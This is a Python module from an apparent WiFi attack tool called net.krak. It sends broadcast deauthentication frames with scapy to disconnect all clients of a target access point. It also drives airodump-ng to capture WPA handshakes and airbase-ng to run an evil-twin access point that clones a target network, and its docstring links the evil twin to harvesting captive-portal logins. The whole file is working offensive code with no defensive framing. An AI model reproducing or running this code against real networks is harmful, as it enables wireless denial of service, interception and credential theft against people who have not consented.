"""
attacks.py - WiFi attack logic for net.krak
"""
import logging
import subprocess
import shutil
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp

def deauth_attack(interface, target_bssid, packet_count=10, dry_run=False, logger=None):
    if logger is None:
        logger = logging.getLogger("attacks")
    if dry_run:
        logger.info(f"[DRY RUN] Would send {packet_count} deauth packets to {target_bssid} on {interface}")
        return
    target_client = 'ff:ff:ff:ff:ff:ff' # Broadcast address to deauth all clients
    dot11 = Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    try:
        sendp(packet, iface=interface, count=packet_count, inter=0.1, verbose=False)
        logger.info(f"Sent {packet_count} deauth packets to {target_bssid} on {interface}")
    except Exception as e:
        logger.error(f"Failed to send deauth packets: {e}")

def run_external_tool(cmd_args, dry_run=False, logger=None):
    if logger is None:
        logger = logging.getLogger("attacks")
    if shutil.which(cmd_args[0]) is None:
        logger.error(f"Required tool '{cmd_args[0]}' not found in PATH.")
        return None
    if dry_run:
        logger.info(f"[DRY RUN] Would run: {' '.join(cmd_args)}")
        return "DRY_RUN_PROCESS" # Return a placeholder to indicate success
    try:
        proc = subprocess.Popen(cmd_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        logger.info(f"Started process: {' '.join(cmd_args)} (PID {proc.pid})")
        return proc
    except FileNotFoundError:
        logger.error(f"Command '{cmd_args[0]}' not found. Is aircrack-ng suite installed and in your PATH?")
        return None
    except Exception as e:
        logger.error(f"Failed to start process {' '.join(cmd_args)}: {e}")
        return None

def capture_handshake(interface, bssid, channel, output_prefix="handshake", dry_run=False, logger=None):
    if not channel:
        if logger:
            logger.warning("No channel provided for handshake capture; airodump-ng will hop channels.")
        cmd = ["airodump-ng", "--bssid", bssid, "-w", output_prefix, interface]
    else:
        cmd = ["airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", output_prefix, interface]
    return run_external_tool(cmd, dry_run=dry_run, logger=logger)

def perform_evil_twin(interface, bssid, ssid, dry_run=False, logger=None):
    cmd = ["airbase-ng", "-a", bssid, "-e", ssid, "--essid", ssid, interface]
    return run_external_tool(cmd, dry_run=dry_run, logger=logger)

def capture_credentials(interface, bssid, channel, output_prefix="captured_creds", dry_run=False, logger=None):
    """
    This is conceptually similar to capturing a handshake but might imply a longer monitoring period
    or use with an evil twin to capture login attempts on a captive portal. For CLI purposes,
    it will use airodump-ng to monitor the target network.
    """
    if not channel:
        if logger:
            logger.warning("No channel provided for credential capture; airodump-ng will hop channels.")
        cmd = ["airodump-ng", "--bssid", bssid, "-w", output_prefix, interface]
    else:
        cmd = ["airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", output_prefix, interface]
    return run_external_tool(cmd, dry_run=dry_run, logger=logger)
